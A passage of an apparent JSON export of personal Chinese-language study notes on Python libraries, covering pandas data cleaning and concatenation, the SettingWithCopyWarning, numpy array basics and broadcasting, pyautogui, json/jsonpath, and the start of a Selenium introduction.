NaN   6   7\n# c  8  9.0  NaN  11\n\nprint(pd.notna(t1[\"X\"]))\n# Out\n# a     True\n# b    False\n# c     True\n\nt2 = t1[pd.notna(t1[\"X\"])]\nprint(t2)\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# c  8  9.0  NaN  11\n\nprint(t1.mean())\n# Out\n# W    4.0\n# X    5.0\n# Y    4.0\n# Z    7.0\n\nprint(t1.fillna(t1.mean(),inplace=True))\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# b  4  5.0   6   7\n# c  8  9.0   4   11\n\nt1.iloc[1,1] = np.nan\nt1.iloc[2,2] = np.nan\nprint(t1)\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# b  4  NaN   6   7\n# c  8  9.0  NaN  11\n\nt1[\"Y\"] =  t1[\"Y\"].fillna(t1[\"Y\"].mean())\nprint(t1)\n# Out\n#    W    X   Y   Z\n# a  0  1.0   2   3\n# b  4  NaN   6   7\n# c  8  9.0   4  11\n\n```\n\n# 数据合并\n## join\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025184051.png\">\n\n## merge\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025184127.png\">\n\n## concat\nconcat函数是在pandas底下的方法，可以将数据根据不同的轴作简单的融合\n```python \npd.concat(objs, axis=0, join='outer', join_axes=None, ignore_index=False,\n       keys=None, levels=None, names=None, verify_integrity=False)\n```\n参数说明\nobjs: series，dataframe或者是panel构成的序列lsit\naxis： 需要合并链接的轴，0是行，1是列\njoin：连接的方式 inner，或者outer\n\n1.1 相同字段的表首尾相接\n```python\n# 现将表构成list，然后在作为concat的输入\nIn [4]: frames = [df1, df2, df3]\nIn [5]: result = pd.concat(frames)\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025185855.png\">\n\n要在相接的时候在加上一个层次的key来识别数据源自于哪张表，可以增加key参数\n```python\nIn [6]: result = pd.concat(frames, keys=['x', 'y', 'z'])\n```\n效果如下\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025185945.png\">\n\n1.2 横向表拼接（行对齐）\n1.2.1 axis\n当axis = 1的时候，concat就是行对齐，然后将不同列名称的两张表合并\n```python\nIn [9]: result = pd.concat([df1, df4], axis=1)\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190034.png\">\n\n1.2.2 join\n加上join参数的属性，如果为’inner’得到的是两表的交集，如果是outer，得到的是两表的并集。\n```python\nIn [10]: result = pd.concat([df1, df4], axis=1, join='inner')\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190125.png\">\n\n1.2.3 join_axes\n如果有join_axes的参数传入，可以指定根据那个轴来对齐数据\n例如根据df1表对齐数据，就会保留指定的df1表的轴，然后将df4的表与之拼接\n```python\nIn [11]: result = pd.concat([df1, df4], axis=1, join_axes=[df1.index])\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190230.png\">\n\n1.3 append\nappend是series和dataframe的方法，使用它就是默认沿着列进行凭借（axis = 0，列对齐）\n```python\nIn [12]: result = df1.append(df2)\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190315.png\">\n\n1.4 无视index的concat\n如果两个表的index都没有实际含义，使用ignore_index参数，置true，合并的两个表就睡根据列字段对齐，然后合并。最后再重新整理一个新的index。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190333.png\">\n\n1.5 合并的同时增加区分数据组的键\n前面提到的keys参数可以用来给合并后的表增加key来区分不同的表数据来源\n\n1.5.1 可以直接用key参数实现\n```python\nIn [27]: result = pd.concat(frames, keys=['x', 'y', 'z'])\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190402.png\">\n\n1.5.2 传入字典来增加分组键\n```python\nIn [28]: pieces = {'x': df1, 'y': df2, 'z': df3}\nIn [29]: result = pd.concat(pieces)\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190427.png\">\n\n\n1.6 在dataframe中加入新的行\nappend方法可以将 series 和 字典就够的数据作为dataframe的新一行插入。\n\n```python\nIn [34]: s2 = pd.Series(['X0', 'X1', 'X2', 'X3'], index=['A', 'B', 'C', 'D'])\n\nIn [35]: result = df1.append(s2, ignore_index=True)\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190500.png\">\n\n表格列字段不同的表合并\n如果遇到两张表的列字段本来就不一样，但又想将两个表合并，其中无效的值用nan来表示。那么可以使用ignore_index来实现。\n```python\nIn [36]: dicts = [{'A': 1, 'B': 2, 'C': 3, 'X': 4},\n   ....:          {'A': 5, 'B': 6, 'C': 7, 'Y': 8}]\n   ....: \n\nIn [37]: result = df1.append(dicts, ignore_index=True)\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191025190527.png\">\n\n# SettingWithCopyWarning问题\n这段时间一直在用pandas，今天运行前人代码发现报了一个warning：\n```\nSettingWithCopyWarning:\nA value is trying to be set on a copy of a slice from a DataFrame\nSee the caveats in the documentation: http://pandas.pydata.org/pandas-docs/stable/indexing.html#indexing-view-versus-copy\n```\n网上查了下，发现有这个问题的人还不少，但是感觉大家都没太说到点上，到底这个错误是如何产生的以及如何避免。不少方法基本上都是想办法绕过这个warning或者直接禁用掉warning提示，这样并不知道其中的原理，只是避而不见，确实不是一个好的变成习惯。后来上google上搜，看到了一个youtube视频和一篇外文Blog解释得还是非常清楚的。Youtube视频解释的比较简略，blog解释的更详细了一些。\n现在总结如下：\n\n## SettingWithCopyWarning出现的原因\n链式赋值/Chained Assignment\nSettingWithCopyWarning会在什么时候出现呢，简而言之就是在链式赋值的时候出现。\n以下例子数据以此为例：\n```python\ndf1 = pd.DataFrame(np.random.random(20).reshape((10,2)), columns=list('AB'))\ndf1\n```\n结果如下\n```\nA\tB\n0\t0.407007\t0.286344\n1\t0.140339\t0.036872\n2\t0.450920\t0.320719\n3\t0.783196\t0.987610\n4\t0.011362\t0.263995\n5\t0.968380\t0.628029\n6\t0.465733\t0.618144\n7\t0.441445\t0.426087\n8\t0.831295\t0.911736\n9\t0.447908\t0.653442\n```\n什么是链式\n链式就是进行多次同类型的操作，比如a = b = c = 4就是一个链式操作。在这里的链式操作主要是指，对于一个pandas格式的表，选取两次或者以上次数的其中结果。\n比如选取其中A值小于0.3的行得到：\n```python\ndf1[df1.A < 0.3]\n```\n结果如下：\n```\n    A        \tB\n1\t0.140339\t0.036872\n4\t0.011362\t0.263995\n```\n那么选取其中所有A<0.3的B列值可以写为：\n```python\ndf1[df1.A < 0.3].B\n```\n得到：\n```\n1 0.036872\n4 0.263995\nName: B, dtype: float64\n```\n以上中，先选取左右A<0.3的行，其次再从中选取B列，上述操作将其分为两部，那么这样就是链式操作。\n\n那么链式赋值呢？\n如果此时要进行：选取其中所有A<0.3的B列值并将其赋值为1，如果进行：\n```python\ndf1[df1.A < 0.3].B = 1\n```\n此时就会报错SettingWithCopyWarning的Warning\n如果此时再查看df1里面的值，会发现完全没有改变。\n【所以此时这个爆warning是非常有意义的，如果单纯的忽略掉则会导致程序错误。】\n\n根据会提示用loc函数。\n用loc函数如下：\n```python\ndf1.loc[df1.A<0.3, 'B'] = 1\n```\n运行完后再查看就会发现df1里面的对应着都变为1了。\n\n出现的原因\n官方的解释是，pandas这个机制设计如此，凡事出现链式赋值的情况，pandas都是不能够确定到底返回的是一个引用还是一个拷贝。所以遇到这种情况就干脆报warning\n\n更隐蔽的链式赋值\n有些时候比如将链式给拆解成为多步的时候，就是一些隐式的情况。\n比如：\n```python\ndf2 = df1.loc[df1.A<0.3]\ndf2.loc[1,'B'] = 2\n```\n虽然这两步每步都用了loc，但是凡是把取值（GET）操作分为两步的，仍然是链式赋值的状态，所以仍然会报warning。\n不过再次查看df2发现df2的值确实已经改变过来了，查看df1的值，发现df1的值没有变。\n所以之前那次用loc取出的就是引用，这次就变成拷贝了。也就是说链式赋值是一个要避免的状态。\n如果明确说要用拷贝怎么办，就是如下：\n```python\ndf2 = df1.loc[df1.A<0.3].copy()\n```\n假阴性\n有些情况下，出现了链式拷贝但是不会报错，所以会出现假阴性【相对应的，也会出现假阳性，即报错了，但是实际上没有链式赋值出现，但是这种一般出现在早起pandas版本中，现在新版本应该不会有了】\n比如下面个：\n```python\ndf1.loc[df1.A<0.3, ('A','B')].B = 3\ndf1\n```\n此时没有报warning，但是再查看df1发现仍然没有任何改变。\n\n## 总结\n这里总结一下pandas的这个问题：\n避免任何形式的链式赋值，有可能会报warning也有可能不会报。而且即使报了，可能有问题，也可能没问题。\n如果需要用到多级选取，则用loc\n如果需要用到拷贝，则直接加copy()函数\n\n# 常用方法或属性\n## columns\n获取DataFrame的所有列名，返回的类型是<class 'pandas.core.indexes.base.Index'>\n可以将其转换成list\n```python\ncolumns_name = list(df.columns)\n```\n## unique( )\n唯一值\n\n```python\nIn [141]: obj=pd.Series(['c','a','d','a','a','b','b','c','c','c'])\n\nIn [142]: obj.unique()\nOut[142]: array(['c', 'a', 'd', 'b'], dtype=object)\n```\n## value_counts()\n计数值\n```python\nIn [143]: obj.value_counts()\nOut[143]:\nc    4\na    3\nb    2\nd    1\ndtype: int64\n```\n## isin()\n成员资格\n```\nIn [144]: obj.isin(['a','b'])\nOut[144]:\n0    False\n1     True\n2    False\n3     True\n4     True\n5     True\n6     True\n7    False\n8    False\n9    False\ndtype: bool\n```\n## apply()\napply函数是`pandas`里面所有函数中自由度最高的函数。该函数如下：\n```python\nDataFrame.apply(func, axis=0, broadcast=False, raw=False, reduce=None, args=(), **kwds)\n```\n该函数最有用的是第一个参数，这个参数是函数，相当于C/C++的函数指针。\n这个函数需要自己实现，函数的传入参数根据axis来定，比如axis = 1，就会把一行数据作为Series的数据结构传入给自己实现的函数中，我们在函数中实现对Series不同属性之间的计算，返回一个结果，则apply函数会自动遍历每一行DataFrame的数据，最后将所有结果组合成一个Series数据结构并返回。\n```python\n#函数应用和映射\nimport numpy as np\nimport pandas as pd\ndf=pd.DataFrame(np.random.randn(4,3),columns=list('bde'),index=['utah','ohio','texas','oregon'])\nprint(df)\n```\n```\n b         d         e\nutah   -0.451195 -0.183451 -0.297182\nohio    0.443792  0.925751 -1.320857\ntexas   1.039534 -0.927392  0.611482\noregon  0.938760  1.265244  0.313582\n```\n```python\n#将函数应用到由各列或行形成的一维数组上。DataFrame的apply方法可以实现此功能\nf=lambda x:x.max()-x.min()\n#默认情况下会以列为单位，分别对列应用函数\nt1=df.apply(f)\nprint(t1)\nt2=df.apply(f,axis=1)\nprint(t2)\n```\n```\nb    1.490729\nd    2.192636\ne    1.932339\ndtype: float64\nutah      0.267744\nohio      2.246608\ntexas     1.966925\noregon    0.951662\ndtype: float64\n```\n```python\n#除标量外，传递给apply的函数还可以返回由多个值组成的Series\ndef f(x):\n    return pd.Series([x.min(),x.max()],index=['min','max'])\nt3=df.apply(f)\n#从运行的结果可以看出，按列调用的顺序，调用函数运行的结果在右边依次追加\nprint(t3)\n```\nb         d         e\nmin -0.451195 -0.927392 -1.320857\nmax  1.039534  1.265244  0.611482\n```\n```python\n#元素级的python函数，将函数应用到每一个元素\n#将DataFrame中的各个浮点值保留两位小数\nf=lambda x: '%.2f'%x\nt3=df.applymap(f)\nprint(t3)\n```\n```\n b      d      e\nutah    -0.45  -0.18  -0.30\nohio     0.44   0.93  -1.32\ntexas    1.04  -0.93   0.61\noregon   0.94   1.27   0.31\n```\n#注意，这里之所以叫applymap,是因为Series有一个永远元素级函数的map方法\n```python\nt4=df['e'].map(f)\nprint(t4)\n```\n```\nutah      -0.30\nohio      -1.32\ntexas      0.61\noregon     0.31\nName: e, dtype: object\n```\n## max()、min()\n默认是对列进行操作， 可以通过axis参数来改变\n```python\nn1\n# Out\n#    A\tB\tC\tD\n# a  0\t1\t2\t3\n# b  4\t5\t6\t7\n# c  8\t9\t10  11\n\nprint(n1.max())\n# Out\n# A     8\n# B     9\n# C    10\n# D    11\n# dtype: int32\n\nprint(n1.max(axis=1))\n# Out\n# a     3\n# b     7\n# c    11\n# dtype: int32\n```\n"
  },
  {
    "title": "./notes/python库/numpy.md",
    "body": "---\ntitle: numpy\ndate: 2019/12/1\nupdate: {{ date }}\ncategories:\n - back-end\n - python\n---\nnumpy:\n一个在Python中做科学计算的基础库，重在数值计算，也是大部分PYTHON科学计算库的基础库，多用于在大型、多维数组上执行数值运算\n# Numpy创建数组\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015203922.png\">\n\n```python\n# create a numpy array with the all elements' values as 0\nzeros_data = np.zeros((2,3))\n#Out\n# [[0. 0. 0.]\n#  [0. 0. 0.]]\n\n# create a numpy array with the all elements' values as 1\nones_data = np.ones((2,3))\n#Out\n# [[1. 1. 1.]\n#  [1. 1. 1.]]\n\n# create a square array with ones on the diagonal and zeros elsewhere.\neye_data = np.eye(3)\n#Out\n# [[1. 0. 0.]\n#  [0. 1. 0.]\n#  [0. 0. 1.]]\n\n# create a Arithmetic array\n# The linspace function can have three paramters. The first parameter indicates the begin number. The second parameter indicates the end number. The third parameter indicates the amount of number.\narithmetic_data = np.linspace(1,5,10)\nprint(arithmetic_data)\n# Out\n# [1.         1.44444444 1.88888889 2.33333333 2.77777778 3.22222222\n#  3.66666667 4.11111111 4.55555556 5.        ]\n\n```\n\n# numpy中常见的更多自带的数据类型\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015204319.png\">\n\n# 数据类型的操作\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015204903.png\">\n\n注： `a.astype()`并不会在修改a， 要想修改a, 可以使用`a = a.astype(np.int8)`\n\n# 数组的形状\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015211852.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015210106.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015212155.png\">\n\n# 数组与数的计算\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015212653.png\">\n\n# 数组与数组的计算\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015212727.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015212843.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015212929.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015212957.png\">\n原因： numpy的数组广播原则\n\n# numpy数组的广播原则hj\n广播原则：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015215310.png\">\n如何计算后缘维度的轴长度？ 可以使用代码`A.shape[-1]`， 即矩阵维度元组中的最后一位置的值，就是矩阵维度的最后一个维度， 比如（3，4，2）的 后缘维度的轴长度为2\n\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015215811.png\">\n\n根据广播原则分析：arr1的shape为(3,4,2),arr2的shape为(4,2)，它们的后缘轴长度都为(4,2)，所以可以在0轴进行广播，arr2的shape变为(3,4,2).\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015215846.png\">\n\n# numpy中多维数组的轴（axis）\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191017164530.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191017164627.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191017164839.png\">\n\n多维数组的轴（axis=）是和该数组的size（或者shape）的元素是相对应的；\n```python\n>>> np.random.seed(123)\n>>> X = np.random.randint(0, 5, [3, 2, 2])\n>>> print(X)\n\n[[[5 2]\n  [4 2]]\n\n [[1 3]\n  [2 3]]\n\n [[1 1]\n  [0 1]]]\n\n>>> X.sum(axis=0)\narray([[7, 6],\n       [6, 6]])\n\n>>> X.sum(axis=1)\narray([[9, 4],\n       [3, 6],\n       [1, 2]])\n\n>>> X.sum(axis=2)\narray([[7, 6],\n       [4, 5],\n       [2, 1]])\n```\n如果将三维数组的每一个二维看做一个平面（plane，X[0, :, :], X[1, :, :], X[2, :, :]），三维数组即是这些二维平面层叠（stacked）出来的结果。则（axis=0）表示全部平面上的对应位置，（axis=1），每一个平面的每一列，（axis=2），每一个平面的每一行。\n\n# numpy读取数据\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191018082356.png\">\n\n# numpy中的转置\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191018141121.png\">\n\n# numpy索引和切片\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020155329.png\">\n\n```python\n# take multiple lines that aren't consecutive\nprint(a[[1,2]])\n# Out\n# [[ 4  5  6  7]\n# [ 8  9 10 11]]\n\n# take multiple columns that aren't consecutive\nprint(a[1:3,[1,2]])\n# Out\n# [[ 5  6]\n# [ 9 10]]\n\n# take multiple non-adjacent points\nprint(a[[1,2],[0,2]])\n# Out\n# [ 4 10]\n\n```\n\nNote: when you get the consecutive rows rows or columns, it will return the reference to the numpy, not the value of the numpy. Note that must be consecutive, if not, it will return the value of the numpy, not the reference to numpy;\nFor example:\n```python\nt\n#Out\n# [[ 0  1  2  3  4  5]\n#  [ 6  7  8  9 10 11]\n#  [12 13 14 15 16 17]\n#  [18 19 20 21 22 23]]\n\n# ---------------------------------------------------------------------------\n# The case of not taking the consecutive rows or columns\na = t[:, [1,3]]\n# Out\n# [[ 1  3]\n#  [ 7  9]\n#  [13 15]\n#  [19 21]]\n\na[[0], [0]] = 2\nprint(a)\n#Out\n# [[ 2  3]\n#  [ 7  9]\n#  [13 15]\n#  [19 21]]\n\nprint(t)\n#Out\n# [[ 0  1  2  3  4  5]\n#  [ 6  7  8  9 10 11]\n#  [12 13 14 15 16 17]\n#  [18 19 20 21 22 23]]\n\n# ---------------------------------------------------------------------------\n# The case of taking the consecutive rows\nb = t[:, 1:3]\nprint(b)\n#Out\n# [[ 1  2]\n#  [ 7  8]\n#  [13 14]\n#  [19 20]]\n\nb[[0], [0]] = 2\nprint(b)\n# Out\n# [[ 2  2]\n#  [ 7  8]\n#  [13 14]\n#  [19 20]]\n\nprint(t)\n#Out\n# [[ 0  2  2  3  4  5]\n#  [ 6  7  8  9 10 11]\n#  [12 13 14 15 16 17]\n#  [18 19 20 21 22 23]]\n\n```\n# numpy中数组的修改\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020162125.png\">\n\n## numpy中布尔索引\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020162403.png\">\n\nthe t[t<10] return a array containing these numbers that satisfy the condition t<10;\nFor example:\n```python\nt\n# Out\n#[[ 0  1  2  3  4  5]\n# [ 6  7  8  9 10 11]\n# [12  2 14 15 16 17]\n# [18 19 20 21 22 23]]\n\nt[t<10]\n# Out\n# array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 2])\n```\n## numpy中三元运算\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020162620.png\">\n## numpy中的clip\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020162732.png\">\n## numpy中的nan和inf\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020164653.png\">\n### numpy中的nan的注意点\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020165324.png\">\n\n```python\nt\n#Out\n#[ 2. nan 14. 20.]\n\nnp.isnan(t)\n#Out\n#[False  True False False]\n\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020165845.png\">\n\n## numpy中常用统计函数\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191020170140.png\">\n\n```pyton\n# Get the indexs of maximum or minimum on each rows or columns. Return a array\nnp.argmax(t.axis=0)\nnp.argmin(t.axis=1)\n```\n\n## 数组的拼接\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022193005.png\">\n\n## 数组的行列交换\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022193409.png\">\n\n## numpy生成随机数\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022202223.png\">\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022202311.png\">\n\n## numpy中的copy和view\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191022202555.png\">\n"
  },
  {
    "title": "./notes/python库/pyautogui.md",
    "body": "# 1. 安装pyautogui库\n```shell\npip3 install pyautogui\n```\n[pyautogui官网](https://muxuezi.github.io/posts/doc-pyautogui.html)\n\n# 2. 常用方法\n## 2.1 yautogui.click()\n这个函数是用于模拟鼠标的点击动作，比如：pyautogui.click(100,500)就是让鼠标移动到（100，500）这个位置然后点击。\n\n## 2.2 pyautogui.doubleClick()\n这个函数和上一个很像，确实，这是双击，注意这里的C是大写的，用法和上面一样\n\n## 2.3 pyautogui.typewrite()\n```python3\npyautogui.typewrite(['1','7','0','6','3','0','0','1','tab'],'0.25')\n```\n前面的数字就是分别打出数字，‘tab’是键盘上的TAB功能键，注意两边是用[ ]括起来的。后面的’0.25‘是时间，意思就是打出这几个数字需要多少时间，可大可小很好用。\n`pyautogui.typewrite('154642',0.25)`也可以这么用，直接打出这几个数字，不需要那么复杂，但是这个不能打出键盘功能键。\n## 2.4 pyautogui.position()\n直接在python的idle中输入pyautogui.position()就行了，它就会返回鼠标的位置。\n\n## 2.5 PyAutoGUI键盘表：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200111174123.png\"/>\n\n# 3. 输入中文\n我想了一个凑合能用的办法，但是不适合大范围输入，如果只要输入个姓名，性别啥的可以完成。\n```python\npyautogui.typewrite(['l','i','h','a','i','g','u','a','n','1',],'0.25')\n```\n\n大家可以先切入中文输入法试一下，前面的字母就是用中文输入法输入拼音，后面的'1'就是打字中的选择喽。大家能理解这个意思就行了，是不是感觉很粗糙，嘿嘿嘿。\n\n# 4. 实战\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200111174656.png\"/>"
  },
  {
    "title": "./notes/python库/json与jsonpath.md",
    "body": "\n# JSON与JsonPATH\n\nJSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，它使得人们很容易的进行阅读和编写。同时也方便了机器进行解析和生成。适用于进行数据交互的场景，比如网站前台与后台之间的数据交互。\nJSON和XML的比较可谓不相上下。\nPython 2.7中自带了JSON模块，直接`import json`就可以使用了。\n官方文档：http://docs.python.org/library/json.html\nJson在线解析网站：http://www.json.cn/#\n\n# JSON\njson模块提供了四个功能：`dumps`、`dump`、`loads`、`load`，用于字符串 和 python数据类型间进行转换。\n## json.loads()\n把Json格式字符串解码转换成Python对象 从json到python的类型转化对照如下：\n```python\nimport json\n\nstrList = '[1, 2, 3, 4]'\nstrDict = '{\"city\": \"北京\", \"name\": \"大猫\"}'\n\njson.loads(strList) \n# [1, 2, 3, 4]\n\njson.loads(strDict) # json数据自动按Unicode存储\n# {u'city': u'\\u5317\\u4eac', u'name': u'\\u5927\\u732b'}\n```\n\n## json.dumps()\n实现python类型转化为json字符串，返回一个str对象 把一个Python对象编码转换成Json字符串\n```python\nimport json\nimport chardet\n\nlistStr = [1, 2, 3, 4]\ntupleStr = (1, 2, 3, 4)\ndictStr = {\"city\": \"北京\", \"name\": \"大猫\"}\n\njson.dumps(listStr)\n# '[1, 2, 3, 4]'\njson.dumps(tupleStr)\n# '[1, 2, 3, 4]'\n\n# 注意：json.dumps() 处理中文时默认使用的ascii编码，会导致中文无法正常显示\nprint json.dumps(dictStr) \n# {\"city\": \"\\u5317\\u4eac\", \"name\": \"\\u5927\\u732b\"}\n\n# 记住：处理中文时，添加参数 ensure_ascii=False 来禁用ascii编码\nprint json.dumps(dictStr, ensure_ascii=False) \n# {\"city\": \"北京\", \"name\": \"大刘\"}\n```\n\n## json.dump()\n将Python内置类型序列化为json对象后写入文件\n```python\nimport json\n\nlistStr = [{\"city\": \"北京\"}, {\"name\": \"大刘\"}]\njson.dump(listStr, open(\"listStr.json\",\"w\"), ensure_ascii=False)\n\ndictStr = {\"city\": \"北京\", \"name\": \"大刘\"}\njson.dump(dictStr, open(\"dictStr.json\",\"w\"), ensure_ascii=False)\n```\n\n## json.load()\n读取文件中json形式的字符串元素 转化成python类型\n```python\n# json_load.py\n\nimport json\n\nstrList = json.load(open(\"listStr.json\"))\nprint strList\n\n# [{u'city': u'\\u5317\\u4eac'}, {u'name': u'\\u5927\\u5218'}]\n\nstrDict = json.load(open(\"dictStr.json\"))\nprint strDict\n# {u'city': u'\\u5317\\u4eac', u'name': u'\\u5927\\u5218'}\n```\n\n# JsonPath\nJsonPath 是一种信息抽取类库，是从JSON文档中抽取指定信息的工具，提供多种语言实现版本，包括：Javascript, Python， PHP 和 Java。\nJsonPath 对于 JSON 来说，相当于 XPath 对于 XML。\n安装方法：`pip install jsonpath`\n官方文档：[http://goessner.net/articles/JsonPath](http://goessner.net/articles/JsonPath/)\n\nJsonPath与XPath语法对比：\nJson结构清晰，可读性高，复杂度低，非常容易匹配，下表中对应了XPath的用法。\n| XPath | JSONPath  | 描述                                                                      |\n| :---: | --------- | ------------------------------------------------------------------------- |\n|  `/`  | `$`       | 根节点                                                                    |\n|  `.`  | `@`       | 现行节点                                                                  |\n|  `/`  | `.`or`[]` | 取子节点                                                                  |\n| `..`  | n/a       | 取父节点，Jsonpath未支持                                                  |\n| `//`  | `..`      | 就是不管位置，选择所有符合条件的条件                                      |\n|  `*`  | `*`       | 匹配所有元素节点                                                          |\n|  `@`  | n/a       | 根据属性访问，Json不支持，因为Json是个Key-value递归结构，不需要属性访问。 |\n| `[]`  | `[]`      | 迭代器标示（可以在里边做简单的迭代操作，如数组下标，根据内容选值等）      |\n|  \\|   | `[,]`     | 支持迭代器中做多选。                                                      |\n| `[]`  | `?()`     | 支持过滤操作.                                                             |\n|  n/a  | `()`      | 支持表达式计算                                                            |\n| `()`  | n/a       | 分组，JsonPath不支持                                                      |\n\n\n**示例：**\n我们以拉勾网城市JSON文件 http://www.lagou.com/lbs/getAllCitySearchLabels.json 为例，获取所有城市。\n```python\nimport urllib2\nimport jsonpath\nimport json\n\nurl = 'http://www.lagou.com/lbs/getAllCitySearchLabels.json'\nrequest =urllib2.Request(url)\nresponse = urllib2.urlopen(request)\nhtml = response.read()\n\n# 把json格式字符串转换成python对象\njsonobj = json.loads(html)\n\n# 从根节点开始，匹配name节点\ncitylist = jsonpath.jsonpath(jsonobj,'$..name')\n\nprint citylist\nprint type(citylist)\nfp = open('city.json','w')\n\ncontent = json.dumps(citylist, ensure_ascii=False)\nprint content\n\nfp.write(content.encode('utf-8'))\nfp.close()\n```\n\n**注意事项：**\njson.loads() 是把 Json格式字符串解码转换成Python对象，如果在json.loads的时候出错，要注意被解码的Json字符的编码，如果传入的字符串的编码不是UTF-8的话，需要指定字符编码的参数`encoding`\n如：\n```python\ndataDict = json.loads(jsonStrGBK);\n```\njsonStrGBK是JSON字符串，假设其编码本身是非UTF-8的话而是GBK 的，那么上述代码会导致出错，改为对应的：\n```python\n    dataDict = json.loads(jsonStrGBK, encoding=\"GBK\");\n```"
  },
  {
    "title": "./notes/python库/selenium.md",
    "body": "# 简介\nSelenium是一个Web自化测过工县，最初是为网站自动化测试而开发的，类型像我们玩游戏用的按键精灵，可以按指定的命令自动操作，不同是Selenium可以直接运行在浏览器上，它支持所有主流的浏览器（包括PhantonmJS这些无界面的浏览器）。\nSelenium 可以根据我们的指令，让浏览器自加载页面，获取需要的数据，甚至页面截屏，或者判断网站上某些动作是否发生。\n\n# 浏览器驱动器\nSelenium自己不带浏览器，不支持浏览器的功能，它需要与第三方浏览器结合在一起才能使用。所以我们需要浏览器驱动器\n例如chronedriver是一个驱动Chrome浏览器的驱动程序，使用他才可以驱动chrome浏览器。当然针对不同的刻览器有不同的driver。以下列出了不同刻览器及其对应的driver：\n- chrome:https://sites.google.com/a/chromium.org/chromedriver/downloads\n- Firefox:https://github.com/mozilla/geckodriver/releases\n- Edge:https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/\n- Safari:https://webkit.org/blog/6900/webdriver-support-in-safar-10/\n\n## 通用驱动器PhantomJS\n[PhantomJS](http://phantomjs.org/) 是一个基于Webkit的“无界面”(headless)浏览器，它会把网站加载到内存并执行页面上的 JavaScript，因为不会展示图形界面，所以运行起来比完整的浏览器要高效。\n如果我们把 Selenium 和 PhantomJS 结合在一起，就可以运行一个非常强大的网络爬虫了，这个爬虫可以处理 JavaScrip、Cookie、headers，以及任何我们真实用户需要做的事情。\nPhantomJS 是一个功能完善(虽然无界面)的浏览器而非一个 Python 库，所以它不需要像 Python 的其他库一样安装，但我们可以通过Selenium调用PhantomJS来直接使用。\n可以从官方网站[http://phantomjs.org/download.html)](http://phantomjs.org/download.html) 下载。\n在Ubuntu16.04中可以使用命令安装：`sudo apt-get install phantomjs`\nPhantomJS 官方参考文档：[http://phantomjs.org/documentation](http://phantomjs.org/documentation/)\n\n注： 新版本Selenium不推荐使用PhantomJS来做驱动\n\n# 快速入门\nSelenium 库里有个叫 WebDriver 的 API。WebDriver 有点儿像可以加载网站的浏览器，但是它也可以像 BeautifulSoup 或者其他 Selector 对象一样用来查找页面元素，与页面上的元素进行交互 (发送文本、点击等)，以及执行其他动作来运行网络爬虫。\n```python\n# 导入 webdriver\nfrom selenium import webdriver\n\n# 调用环境变量指定的PhantomJS浏览器创建浏览器对象\ndriver = webdriver.PhantomJS()\n# 如果使用的其他浏览器驱动，列如：chromedriver，则使用如下代码\n# driver = webdriver.Chrome()\n\n# 